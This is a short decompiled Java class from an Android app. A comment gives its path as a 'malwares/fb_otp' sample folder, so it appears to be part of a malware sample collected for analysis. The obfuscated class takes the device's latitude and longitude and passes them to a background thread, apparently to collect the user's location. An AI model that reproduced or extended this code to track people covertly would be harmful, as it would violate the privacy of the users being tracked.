import android.location.Location;

final class dY
  extends ek
{
  dY(dU paramdU) {}
  
  public final void a(Location paramLocation)
  {
    new StringBuilder("mylocation ").append(paramLocation.getLatitude()).append(" ").append(paramLocation.getLongitude()).toString();
    new Thread(new dZ(this, paramLocation.getLatitude(), paramLocation.getLongitude())).start();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dY.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */